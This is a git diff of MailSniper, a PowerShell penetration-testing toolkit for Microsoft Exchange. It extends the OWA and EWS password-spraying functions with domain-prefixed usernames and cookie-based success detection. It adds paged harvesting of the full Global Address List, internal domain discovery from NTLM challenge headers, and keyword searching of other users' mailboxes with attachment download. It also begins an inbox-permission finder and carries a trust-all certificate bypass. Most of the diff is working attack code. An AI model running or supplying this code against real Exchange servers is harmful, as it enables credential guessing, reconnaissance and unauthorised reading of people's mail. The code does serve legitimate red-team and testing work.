@@ -318,7 +318,7 @@ $TASource=@'
   }
   else 
   {
-    $SMTPAddresses = Get-Mailbox -ResultSize unlimited | Select Name -ExpandProperty EmailAddresses
+    $SMTPAddresses = Get-Mailbox -ResultSize unlimited | Select Name -ExpandProperty PrimarySmtpAddress
     $AllMailboxes = $SMTPAddresses -replace ".*:"
     Write-Host "[*] The total number of mailboxes discovered is: " $AllMailboxes.count
   }
@@ -509,7 +509,8 @@ $TASource=@'
        
     if ($OutputCsv -ne "")
     { 
-      $PostSearchList | Select-Object Sender,ReceivedBy,Subject,Body | Export-Csv "temp-$OutputCsv"
+      $PostSearchList | %{ $_.Body = $_.Body -replace "`r`n",'\n' -replace ",",'&#44;'}
+      $PostSearchList | Select-Object Sender,ReceivedBy,Subject,Body | Export-Csv "temp-$OutputCsv" -encoding "UTF8"
         if ("temp-$OutputCsv")
         {
           Import-Csv "temp-$OutputCsv" | ConvertTo-Csv -NoTypeInformation | Select-Object -Skip 1 | Out-File -Encoding ascii -Append $OutputCsv
@@ -688,7 +689,12 @@ function Invoke-SelfSearch{
 
     [Parameter(Position = 10, Mandatory = $False)]
     [string]
-    $DownloadDir = ""
+    $DownloadDir = "",
+
+    [Parameter(Position = 11, Mandatory = $False)]
+    [switch]
+    $OtherUserMailbox
+
   )
   #Running the LoadEWSDLL function to load the required Exchange Web Services dll
   LoadEWSDLL
@@ -756,22 +762,161 @@ function Invoke-SelfSearch{
     $service.AutoDiscoverUrl($Mailbox, {$true})
   }    
 
-    $msgfolderroot = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::MsgFolderRoot
-    $mbx = New-Object Microsoft.Exchange.WebServices.Data.Mailbox( $Mailbox )
-    $FolderId = New-Object Microsoft.Exchange.WebServices.Data.FolderId( $msgfolderroot, $mbx)  
-    $rootFolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$FolderId)
-    $folderView = [Microsoft.Exchange.WebServices.Data.FolderView]100
-    $folderView.Traversal='Deep'
-    $rootFolder.Load()
-    if ($Folder -ne "all")
+    if($OtherUserMailbox)
     {
-      $CustomFolderObj = $rootFolder.FindFolders($folderView) | Where-Object { $_.DisplayName -eq $Folder }
+        $msgfolderroot = New-Object Microsoft.Exchange.WebServices.Data.FolderId([Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::Inbox,$Mailbox)
+        $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$msgfolderroot)
+        $ItemView = New-Object Microsoft.Exchange.WebServices.Data.ItemView(1)
+        $Item = $service.FindItems($Inbox.Id,$ItemView)  
+
     }
     else
     {
-      $CustomFolderObj = $rootFolder.FindFolders($folderView) 
+        $msgfolderroot = [Microsoft.Exchange.WebServices.Data.WellKnownFolderName]::MsgFolderRoot
+        $mbx = New-Object Microsoft.Exchange.WebServices.Data.Mailbox( $Mailbox )
+        $FolderId = New-Object Microsoft.Exchange.WebServices.Data.FolderId( $msgfolderroot, $mbx)  
+        $rootFolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service,$FolderId)
+        $folderView = [Microsoft.Exchange.WebServices.Data.FolderView]100
+        $folderView.Traversal='Deep'
+        $rootFolder.Load()
+        if ($Folder -ne "all")
+        {
+          $CustomFolderObj = $rootFolder.FindFolders($folderView) | Where-Object { $_.DisplayName -eq $Folder }
+        }
+        else
+        {
+          $CustomFolderObj = $rootFolder.FindFolders($folderView) 
+        }
     }
+
     $PostSearchList = @() 
+    
+    if($OtherUserMailbox)
+    {
+         
+      $PropertySet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
+      $PropertySet.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text
+     
+      $mails = $Inbox.FindItems($MailsPerUser)   
+      
+      if ($regex -eq "")
+      {
+        Write-Output ("[*] Now searching mailbox: $Mailbox for the terms $Terms.")
+      }
+      else 
+      {
+        Write-Output ("[*] Now searching the mailbox: $Mailbox with the supplied regular expression.")    
+      }
+
+      foreach ($item in $mails.Items)
+      {    
+        $item.Load($PropertySet)
+        if ($Regex -eq "")
+        {
+          foreach($specificterm in $Terms)
+          {
+            if ($item.Body.Text -like $specificterm)
+            {
+            $PostSearchList += $item
+            }
+            elseif ($item.Subject -like $specificterm)
+            {
+            $PostSearchList += $item
+            }
+          }
+        }
+        else 
+        {
+          foreach($regularexpresion in $Regex)
+          {
+            if ($item.Body.Text -match $regularexpresion)
+            {
+            $PostSearchList += $item
+            }
+            elseif ($item.Subject -match $regularexpresion)
+            {
+            $PostSearchList += $item
+            }
+          }    
+        }
+        if ($CheckAttachments)
+        {
+          foreach($attachment in $item.Attachments)
+          {
+            if($attachment -is [Microsoft.Exchange.WebServices.Data.FileAttachment])
+            {
+              if($attachment.Name.Contains(".txt") -Or $attachment.Name.Contains(".htm") -Or $attachment.Name.Contains(".pdf") -Or $attachment.Name.Contains(".ps1") -Or $attachment.Name.Contains(".doc") -Or $attachment.Name.Contains(".xls") -Or $attachment.Name.Contains(".bat") -Or $attachment.Name.Contains(".msg"))
+              {
+                $attachment.Load() | Out-Null
+                $plaintext = [System.Text.Encoding]::ASCII.GetString($attachment.Content)
+                if ($Regex -eq "")
+                {
+                  foreach($specificterm in $Terms)
+                  {
+                    if ($plaintext -like $specificterm)
+                    {
+                      Write-Output ("Found attachment " + $attachment.Name)
+                      $PostSearchList += $item
+                      if ($DownloadDir -ne "")
+                      { 
+                        $prefix = Get-Random
+                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + "-" + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
+                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
+                        $DownloadFile.Close()
+                      }
+                    }
+                    elseif ($plaintext -like $specificterm)
+                    {
+                      Write-Output ("Found attachment " + $attachment.Name)
+                      $PostSearchList += $item
+                      if ($DownloadDir -ne "")
+                      { 
+                        $prefix = Get-Random
+                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
+                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
+                        $DownloadFile.Close()
+                      }
+                    }
+                  }
+                }
+                else 
+                {
+                  foreach($regularexpresion in $Regex)
+                  {
+                    if ($plaintext -match $regularexpresion)
+                    {
+                    Write-Output ("Found attachment " + $attachment.Name)
+                    $PostSearchList += $item
+                      if ($DownloadDir -ne "")
+                      { 
+                        $prefix = Get-Random
+                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
+                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
+                        $DownloadFile.Close()
+                      }
+                    }
+                    elseif ($plaintext -match $regularexpresion)
+                    {
+                    Write-Output ("Found attachment " + $attachment.Name)
+                    $PostSearchList += $item
+                      if ($DownloadDir -ne "")
+                      { 
+                        $prefix = Get-Random
+                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
+                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
+                        $DownloadFile.Close()
+                      }
+                    }
+                  }    
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+    
+    else{
     Foreach($foldername in $CustomFolderObj)
     {
         Write-Output "[***] Found folder: $($foldername.DisplayName)"
@@ -913,11 +1058,13 @@ function Invoke-SelfSearch{
         }
       }
     }
+   } 
 
   $PostSearchList | ft -Property Sender,ReceivedBy,Subject,Body
   if ($OutputCsv -ne "")
   { 
-    $PostSearchList | Select-Object Sender,ReceivedBy,Subject,Body | Export-Csv $OutputCsv
+    $PostSearchList | %{ $_.Body = $_.Body -replace "`r`n",'\n' -replace ",",'&#44;'}
+    $PostSearchList | Select-Object Sender,ReceivedBy,Subject,Body | Export-Csv $OutputCsv -encoding "UTF8"
   }
 
 }
@@ -1126,6 +1273,14 @@ function Get-GlobalAddressList{
 
         Password of the email account.
 
+    .PARAMETER StartRow
+
+        Row to start fetching from. (Default: 0)
+
+    .PARAMETER MaxRows
+
+        Maximum number of records to fetch per request.  (Default: 5000)
+
   
   .EXAMPLE
 
@@ -1157,7 +1312,15 @@ function Get-GlobalAddressList{
 
     [Parameter(Position = 4, Mandatory = $False)]
     [string]
-    $Password = ""
+    $Password = "",
+
+    [Parameter(Position = 5, Mandatory = $False)]
+    [string]
+    $StartRow = "",
+
+    [Parameter(Position = 6, Mandatory = $False)]
+    [string]
+    $MaxRows = ""
 
   )
     ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
@@ -1288,33 +1451,54 @@ function Get-GlobalAddressList{
         $emailspre = @()
 
         Write-Output "[*] Now utilizing FindPeople to retrieve Global Address List"
-        
-        #Finally we connect to the FindPeople function using the AddressListId to gather the email addresses
-        $FindPeopleResults = Invoke-WebRequest -Uri $FindPeopleURL -Method POST -ContentType "application/json" -Body "{`"__type`":`"FindPeopleJsonRequest:#Exchange`",`"Header`":{`"__type`":`"JsonRequestHeaders:#Exchange`",`"RequestServerVersion`":`"Exchange2013`",`"TimeZoneContext`":{`"__type`":`"TimeZoneContext:#Exchange`",`"TimeZoneDefinition`":{`"__type`":`"TimeZoneDefinitionType:#Exchange`",`"Id`":`"Mountain Standard Time`"}}},`"Body`":{`"__type`":`"FindPeopleRequest:#Exchange`",`"IndexedPageItemView`":{`"__type`":`"IndexedPageView:#Exchange`",`"BasePoint`":`"Beginning`",`"Offset`":0,`"MaxEntriesReturned`":999999999},`"QueryString`":null,`"ParentFolderId`":{`"__type`":`"TargetFolderId:#Exchange`",`"BaseFolderId`":{`"__type`":`"AddressListId:#Exchange`",`"Id`":`"$AddressListId`"}},`"PersonaShape`":{`"__type`":`"PersonaResponseShape:#Exchange`",`"BaseShape`":`"Default`"},`"ShouldResolveOneOffEmailAddress`":false}}" -Headers @{"X-OWA-CANARY"="$CanaryCookie";"Action"="FindPeople"} -WebSession $owasession
-        $FPPreClean = @()
-        $FPPreClean = $FindPeopleResults.RawContent
-        $FPPreArray = $FPPreClean -split '"EmailAddress":"', 0, "simplematch"
-        $FPPreArray[0] = ""
-        $cleanarray = @()
-        foreach ($entry in $FPPreArray)
-        {
-            if ($entry -ne "")
+		
+		# setup variables for use in paging.
+        $recordsFound = $true
+        $start = $StartRow
+        $maxRows = $MaxRows
+
+        while ($recordsFound) {
+            #Finally we connect to the FindPeople function using the AddressListId to gather the email addresses
+            $FindPeopleResults = Invoke-WebRequest -Uri $FindPeopleURL -Method POST -ContentType "application/json" -Body "{`"__type`":`"FindPeopleJsonRequest:#Exchange`",`"Header`":{`"__type`":`"JsonRequestHeaders:#Exchange`",`"RequestServerVersion`":`"Exchange2013`",`"TimeZoneContext`":{`"__type`":`"TimeZoneContext:#Exchange`",`"TimeZoneDefinition`":{`"__type`":`"TimeZoneDefinitionType:#Exchange`",`"Id`":`"Mountain Standard Time`"}}},`"Body`":{`"__type`":`"FindPeopleRequest:#Exchange`",`"IndexedPageItemView`":{`"__type`":`"IndexedPageView:#Exchange`",`"BasePoint`":`"Beginning`",`"Offset`":$start,`"MaxEntriesReturned`":$maxRows},`"QueryString`":null,`"ParentFolderId`":{`"__type`":`"TargetFolderId:#Exchange`",`"BaseFolderId`":{`"__type`":`"AddressListId:#Exchange`",`"Id`":`"$AddressListId`"}},`"PersonaShape`":{`"__type`":`"PersonaResponseShape:#Exchange`",`"BaseShape`":`"Default`"},`"ShouldResolveOneOffEmailAddress`":false}}" -Headers @{"X-OWA-CANARY"="$CanaryCookie";"Action"="FindPeople"} -WebSession $owasession
+            
+            $start += $maxRows
+            
+			if($FindPeopleResults.RawContent.IndexOf("""ResultSet"":[]") -gt -1)
             {
-                $cleanarray += $entry
+				#if no results are returned, we've reached the end and can exit the loop.
+                $recordsFound = $false
+            }
+
+            if($recordsFound)
+            {
+                $FPPreClean = @()
+                $FPPreClean = $FindPeopleResults.RawContent
+                $FPPreArray = $FPPreClean -split '"EmailAddress":"', 0, "simplematch"
+                $FPPreArray[0] = ""
+                $cleanarray = @()
+                foreach ($entry in $FPPreArray)
+                {
+                    if ($entry -ne "")
+                    {
+                        $cleanarray += $entry
+                    }
+                }
+
+                foreach ($line2 in $cleanarray)
+                {
+                    $split3 = $line2 -split '","RoutingType"', 0, "simplematch"
+                    $emailspre += $split3[0]
+                }
+
+                Write-Output "[*] Now cleaning up the list..."
+                $GlobalAddressList = $emailspre | Sort-Object | Get-Unique
+                Write-Host -ForegroundColor "green" ("[*] Start = " + $start + ", Maxrows = " + $maxRows + ", Total Records = " + $GlobalAddressList.count)
             }
         }
 
-        foreach ($line2 in $cleanarray)
-        {
-            $split3 = $line2 -split '","RoutingType"', 0, "simplematch"
-            $emailspre += $split3[0]
-        }
-
-        Write-Output "[*] Now cleaning up the list..."
-        $GlobalAddressList = $emailspre | Sort-Object | Get-Unique
         Write-Output $GlobalAddressList
         Write-Host -ForegroundColor "green" ("[*] A total of " + $GlobalAddressList.count + " email addresses were retrieved")
-        
+
         #writing results to file
         If ($OutFile -ne "")
         {
@@ -1441,6 +1625,10 @@ function Invoke-PasswordSprayOWA{
        
         Number of password spraying threads to run.
 
+    .PARAMETER Domain
+
+        Specify a domain to be used with each spray. Alternatively the userlist can have users in the format of DOMAIN\username or username@domain.com
+
   
   .EXAMPLE
 
@@ -1472,11 +1660,17 @@ function Invoke-PasswordSprayOWA{
 
     [Parameter(Position = 4, Mandatory = $False)]
     [string]
-    $Threads = "5"
+    $Threads = "5",
+
+    [Parameter(Position = 6, Mandatory = $False)]
+    [string]
+    $Domain = ""
 
   )
     
     Write-Host -ForegroundColor "yellow" "[*] Now spraying the OWA portal at https://$ExchHostname/owa/"
+    $currenttime = Get-Date
+    Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"
     #Setting up URL's for later
     $OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")
     $OWAURL2 = ("https://" + $ExchHostname + "/owa/")
@@ -1527,25 +1721,42 @@ function Invoke-PasswordSprayOWA{
     $Password = $args[1]
     $OWAURL2 = $args[2]
     $OWAURL = $args[3]
+    $Domain = $args[4]
 
     ## end code from http://poshcode.org/624
     ForEach($Username in $args[0])
     {
         #Logging into Outlook Web Access    
-        #Setting POST parameters for the login to OWA
         $ProgressPreference = 'silentlycontinue'
-        $POSTparams = @{destination="$OWAURL2";flags='4';forcedownlevel='0';username="$Username";password="$Password";isUtf8='1'}
-        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body $POSTparams -MaximumRedirection 0 -SessionVariable owasession -ErrorAction SilentlyContinue 
-        $out = $owalogin.RawContent
-        #Looking in the results for the OWA cadata cookie to determine whether authentication was successful or not.
-        if ($out -like "*cadata*")
-        {
-            Write-Output "[*] SUCCESS! User:$username Password:$password"
-            #$sprayed += "$Username`:$Password"
-        }
-        $curr_user+=1 
+	if ($Domain -ne "")
+    {
+        $Username = ("$Domain" + "\" + "$Username")
     }
-    } -ArgumentList $userlists[$_], $Password, $OWAURL2, $OWAURL | Out-Null
+
+    $cadatacookie = ""
+    $sess = ""
+	$owa = Invoke-WebRequest -Uri $OWAURL2 -SessionVariable sess -ErrorAction SilentlyContinue 
+	$form = $owa.Forms[0]
+	$form.fields.password=$Password
+	$form.fields.username=$Username
+        $owalogin = Invoke-WebRequest -Uri $OWAURL -Method POST -Body  $form.Fields -MaximumRedirection 2 -SessionVariable sess -ErrorAction SilentlyContinue 
+        #Check cookie in response
+        $cookies = $sess.Cookies.GetCookies($OWAURL2)
+        foreach ($cookie in $cookies)
+        {
+            if ($cookie.Name -eq "cadata")
+                {
+                $cadatacookie = $cookie.Value
+                }
+        }
+	if ($cadatacookie)
+	{
+		Write-Output "[*] SUCCESS! User:$username Password:$password"
+	}
+	$curr_user+=1 
+
+    }
+    } -ArgumentList $userlists[$_], $Password, $OWAURL2, $OWAURL, $Domain | Out-Null
 
 }
 $Complete = Get-Date
@@ -1614,7 +1825,15 @@ function Invoke-PasswordSprayEWS{
     .PARAMETER ExchangeVersion
 
         In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default this script tries "Exchange2010". Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.
-  
+    
+    .PARAMETER Threads
+       
+        Number of password spraying threads to run.
+    
+    .PARAMETER Domain
+
+        Specify a domain to be used with each spray. Alternatively the userlist can have users in the format of DOMAIN\username or username@domain.com
+
   .EXAMPLE
 
     C:\PS> Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\userlist.txt -Password Fall2016 -Threads 15 -OutFile sprayed-ews-creds.txt
@@ -1649,10 +1868,16 @@ function Invoke-PasswordSprayEWS{
 
     [Parameter(Position = 5, Mandatory = $False)]
     [string]
-    $Threads = "5"
+    $Threads = "5",
+
+    [Parameter(Position = 6, Mandatory = $False)]
+    [string]
+    $Domain = ""
 
   )
     Write-Host -ForegroundColor "yellow" "[*] Now spraying the EWS portal at https://$ExchHostname/EWS/Exchange.asmx"
+    $currenttime = Get-Date
+    Write-Host -ForegroundColor "yellow" "[*] Current date and time: $currenttime"
     #Running the LoadEWSDLL function to load the required Exchange Web Services dll
     $Usernames = Get-Content $UserList
     $count = $Usernames.count
@@ -1725,6 +1950,12 @@ function Invoke-PasswordSprayEWS{
                 $ExchHostname = $args[2]
                 $Mailbox = $args[3]
                 $Password = $args[5]
+                $Domain = $args[7]
+
+                if ($Domain -ne "")
+                {
+                $UserName = ("$Domain" + "\" + "$UserName")
+                }
 
                 #converting creds to use with EWS
                 $remotecred = New-Object System.Management.Automation.PSCredential -ArgumentList $UserName,$userPassword
@@ -1754,7 +1985,7 @@ function Invoke-PasswordSprayEWS{
    
 
             }
-        } -ArgumentList $userlists[$_], $userPassword, $ExchHostname, $Mailbox, $ExchangeVersion, $Password, $UncompressedFileBytes | Out-Null
+        } -ArgumentList $userlists[$_], $userPassword, $ExchHostname, $Mailbox, $ExchangeVersion, $Password, $UncompressedFileBytes, $Domain | Out-Null
     
     }
     $Complete = Get-Date
@@ -1833,14 +2064,27 @@ function Invoke-DomainHarvestOWA {
     .PARAMETER CompanyName
         
         Automatically generate and try potential domain names based upon a company name
+
+    .PARAMETER Brute
+
+        Causes Invoke-DomainHarvestOWA to attempt to perform a timing attack to determine the internal domain name.
   
   .EXAMPLE
 
-    C:\PS> Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt
+    C:\PS> Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt -brute
 
     Description
     -----------
     This command will connect to the Outlook Web Access server at https://mail.domain.com/owa/ and attempt to harvest a list of valid domains by combining each potential domain name provided with an arbitrary username and password and write to a file called owa-valid-users.txt.
+
+  
+  .EXAMPLE
+
+    C:\PS> Invoke-DomainHarvestOWA -ExchHostname mail.domain.com 
+
+    Description
+    -----------
+    This command will connect to the Outlook Web Access server at https://mail.domain.com/autodiscover/Autodiscover.xml, and https://mail.domain.com/EWS/Exchange.asmx and attempt to enumerate the internal domain name based off of the WWW-Authenticate header response.
 
 #>
   Param(
@@ -1850,7 +2094,7 @@ function Invoke-DomainHarvestOWA {
     [system.URI]
     $ExchHostname = "",
 
-    [Parameter(Position = 1, Mandatory = $True)]
+    [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $OutFile = "",
 
@@ -1860,37 +2104,20 @@ function Invoke-DomainHarvestOWA {
 
     [Parameter(Position = 3, Mandatory = $False)]
     [string]
-    $CompanyName = ""
+    $CompanyName = "",
+
+    [Parameter(Position = 4, Mandatory = $False)]
+    [switch]
+    $Brute
 
   )
     
-    Write-Host -ForegroundColor "yellow" "[*] Harvesting Domain Name from the OWA portal at https://$ExchHostname/owa/"
+    Write-Host -ForegroundColor "yellow" "[*] Harvesting domain name from the server at $ExchHostname"
     #Setting up URL's for later
     $OWAURL = ("https://" + $ExchHostname + "/owa/auth.owa")
     $OWAURL2 = ("https://" + $ExchHostname + "/owa/")
-    
-    $Domains = @()
-
-    if ($DomainList -ne "") {
-        $Domains += Get-Content $DomainList
-    }
-    elseif ($CompanyName -ne "") {
-        
-        #Generate a list of potential domain names based on spacing and mixed capitalization
-        $Domains = Gen-Names -Name $CompanyName
-    }
-    else {
-        Write-Output -ForegroundColor "red" "You must provide either a DomainList or a ComapnyName"
-        return
-    }
-
-    #Generate random 10-character username and password
-    #source: https://blogs.technet.microsoft.com/heyscriptingguy/2015/11/05/generate-random-letters-with-powershell/
-    $Username = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
-    $Password = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
-    $sprayed = @()
-    $domainlists = @{}
-    $count = 0 
+    $autodiscoverurl = ("https://" + $ExchHostname + "/autodiscover/autodiscover.xml")
+    $ewsurl = ("https://" + $ExchHostname + "/EWS/Exchange.asmx")
 
 
     ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
@@ -1925,6 +2152,35 @@ function Invoke-DomainHarvestOWA {
     $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
     [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll
 
+
+    ## end code from http://poshcode.org/624    
+    
+    if ($Brute)
+    {
+    $Domains = @()
+
+    if ($DomainList -ne "") {
+        $Domains += Get-Content $DomainList
+    }
+    elseif ($CompanyName -ne "") {
+        
+        #Generate a list of potential domain names based on spacing and mixed capitalization
+        $Domains = Gen-Names -Name $CompanyName
+    }
+    else {
+        Write-Output "You must provide either a DomainList or a CompanyName"
+        return
+    }
+
+    #Generate random 10-character username and password
+    #source: https://blogs.technet.microsoft.com/heyscriptingguy/2015/11/05/generate-random-letters-with-powershell/
+    $Username = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
+    $Password = -join ((65..90) + (97..122) | Get-Random -Count 10 | % {[char]$_})
+    $sprayed = @()
+    $domainlists = @{}
+    $count = 0 
+
+
     $AvgTime = Get-BaseLineResponseTime -OWAURL $OWAURL -OWAURL2 $OWAURL2
     $Thresh = $AvgTime * 2.75
 
@@ -1932,7 +2188,6 @@ function Invoke-DomainHarvestOWA {
 
     Write-Host "Threshold: $Thresh"
     Write-Host ""
-    ## end code from http://poshcode.org/624
 	Write-Host "Response Time (MS) `t Domain\Username"
     ForEach($Dom in $Domains)
     {
@@ -1961,6 +2216,70 @@ function Invoke-DomainHarvestOWA {
     if ($OutFile -ne "") {
             $fullresults | Out-File -Encoding ascii $OutFile
             Write-Host "Results have been written to $OutFile."
+    }
+    }
+    else
+    {
+    try 
+    {
+        $webrequest = Invoke-WebRequest -Uri $autodiscoverurl -Method Post -Headers @{"Authorization" = "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
+    }
+    catch
+    {
+        $webrequest = $_.Exception.Response
+        If ($webrequest.StatusCode -eq "Unauthorized")
+        {
+            $headers = $webrequest.Headers
+            foreach ($headerkey in $headers)
+            {
+                if ($headerkey -like "WWW-Authenticate")
+                {
+                $wwwheader = $($headers[$headerkey]) -split ',|\s'
+                $base64decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($wwwheader[1]))
+                $commasep = $base64decoded -replace '[^\x21-\x39\x41-\x5A\x61-\x7A]+', ','
+                $ntlmresparray = @()
+                $ntlmresparray = $commasep -split ','
+                Write-Host ("The domain appears to be: " + $ntlmresparray[7])
+                }
+
+            }
+        }
+        else
+        {
+            Write-Output "[*] Couldn't get domain from Autodiscover URL. Trying EWS URL..."
+            try 
+            {
+                $webrequest = Invoke-WebRequest -Uri $ewsurl -Method Post -Headers @{"Authorization" = "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=="}
+            }
+            catch
+            {
+                $webrequest = $_.Exception.Response
+                If ($webrequest.StatusCode -eq "Unauthorized")
+                {
+                    $headers = $webrequest.Headers
+                    foreach ($headerkey in $headers)
+                    {
+                        if ($headerkey -like "WWW-Authenticate")
+                        {
+                        $wwwheader = $($headers[$headerkey]) -split ',|\s'
+                        $base64decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($wwwheader[1]))
+                        $commasep = $base64decoded -replace '[^\x21-\x39\x41-\x5A\x61-\x7A]+', ','
+                        $ntlmresparray = @()
+                        $ntlmresparray = $commasep -split ','
+                        Write-Host ("The domain appears to be: " + $ntlmresparray[7])
+                        }
+
+                    }
+                }
+                else
+                {
+                Write-Output "[*] Couldn't get domain from EWS. Try the timing attack by specifying a list of possible domains and use the -brute option."
+                Write-Output "Here is an example: Invoke-DomainHarvestOWA -ExchHostname $ExchHostname -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt -Brute"    
+                }
+            }
+        }
+    }
+
     }
 }
 
@@ -2366,4 +2685,1244 @@ function Get-BaseLineResponseTime {
     Write-Host ""
 
     return $AvgTime
+}
+
+function Invoke-OpenInboxFinder{
+
+<#
+  .SYNOPSIS
+
+    This module will connect to a Microsoft Exchange server using Exchange Web Services and check mailboxes to determine if the current user has permissions to access them.
+
+    MailSniper Function: Invoke-OpenInboxFinder
+    Author: Beau Bullock (@dafthack)
+    License: MIT
+    Required Dependencies: None
+    Optional Dependencies: None
+
+  .DESCRIPTION
+
+    This module will connect to a Microsoft Exchange server using Exchange Web Services and check mailboxes to determine if the current user has permissions to access them.
+
+  .PARAMETER ExchHostname
+
+    The hostname of the Exchange server to connect to.
+
+  .PARAMETER Mailbox
+
+    Email address of a single user to check permissions on.
+
+  .PARAMETER ExchangeVersion
+
+    In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default this script tries "Exchange2010". Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.
+  
+  .PARAMETER OutFile
+
+    Outputs the results of the search to a file.
+
+  .PARAMETER EmailList
+
+    List of email addresses one per line to check permissions on.
+
+  .PARAMETER AllPerms
+
+  Returns all of the permission items on an object
+
+  .PARAMETER Remote
+
+  Will prompt for credentials for use with connecting to a remote server such as Office365 or an externally facing Exchange server.
+
+  .EXAMPLE
+
+    C:\PS> Invoke-OpenInboxFinder -EmailList email-list.txt
+
+    Description
+    -----------
+    This command will check if the current user running the PowerShell session has access to each Inbox of the email addresses in the EmailList file.
+
+  .EXAMPLE
+
+    C:\PS> Invoke-OpenInboxFinder -EmailList email-list.txt -ExchHostname outlook.office365.com -Remote
+
+    Description
+    -----------
+    This command will prompt for credentials and then connect to Exchange Web Services on outlook.office365.com to check each mailbox permission. 
+
+#>
+  Param(
+
+    [Parameter(Position = 0, Mandatory = $False)]
+    [string]
+    $Mailbox = "",
+
+    [Parameter(Position = 1, Mandatory = $False)]
+    [system.URI]
+    $ExchHostname = "",
+
+    [Parameter(Position = 2, Mandatory = $False)]
+    [string]
+    $OutFile = "",
+
+    [Parameter(Position = 3, Mandatory = $False)]
+    [string]
+    $ExchangeVersion = "Exchange2010",
+
+    [Parameter(Position = 4, Mandatory = $False)]
+    [string]
+    $EmailList = "",
+
+    [Parameter(Position = 5, Mandatory = $False)]
+    [switch]
+    $AllPerms,
+
+    [Parameter(Position = 6, Mandatory = $False)]
+    [switch]
+    $Remote 
+
+  )
+  
+  #Running the LoadEWSDLL function to load the required Exchange Web Services dll
+  LoadEWSDLL
+  
+  $ErrorActionPreference = 'silentlycontinue' 
+  $Mailboxes = @()
+
+  If ($EmailList -ne "") 
+  {
+    $Mailboxes = Get-Content -Path $EmailList
+    $Mailbox = $Mailboxes[0]
+  } 
+  elseif ($Mailbox -ne "")
+  {
+    $Mailboxes = $Mailbox
+  }
+
+  Write-Output "[*] Trying Exchange version $ExchangeVersion"
+  $ServiceExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
+  $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ServiceExchangeVersion)
+ 
+  #If the -Remote flag was passed prompt for the user's domain credentials.
+  if ($Remote)
+  {
+    $remotecred = Get-Credential
+    $service.UseDefaultCredentials = $false
+    $service.Credentials = $remotecred.GetNetworkCredential()
+  }
+  else
+  {
+    #Using current user's credentials to connect to EWS
+    $service.UseDefaultCredentials = $true
+  }
+
+  ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates     
+  ## Code From http://poshcode.org/624
+
+  ## Create a compilation environment
+  $Provider=New-Object Microsoft.CSharp.CSharpCodeProvider
+  $Compiler=$Provider.CreateCompiler()
+  $Params=New-Object System.CodeDom.Compiler.CompilerParameters
+  $Params.GenerateExecutable=$False
+  $Params.GenerateInMemory=$True
+  $Params.IncludeDebugInformation=$False
+  $Params.ReferencedAssemblies.Add("System.DLL") > $null
+
+  $TASource=@'
+    namespace Local.ToolkitExtensions.Net.CertificatePolicy{
+      public class TrustAll : System.Net.ICertificatePolicy {
+        public TrustAll() { 
+        }
+        public bool CheckValidationResult(System.Net.ServicePoint sp,
+          System.Security.Cryptography.X509Certificates.X509Certificate cert, 
+          System.Net.WebRequest req, int problem) {
+          return true;
+        }
+      }
+    }
+'@ 
+  $TAResults=$Provider.CompileAssemblyFromSource($Params,$TASource)
+  $TAAssembly=$TAResults.CompiledAssembly
+
+  ## We now create an instance of the TrustAll and attach it to the ServicePointManager
+  $TrustAll=$TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
+  [System.Net.ServicePointManager]::CertificatePolicy=$TrustAll
+
+  ## end code from http://poshcode.org/624
+  
+
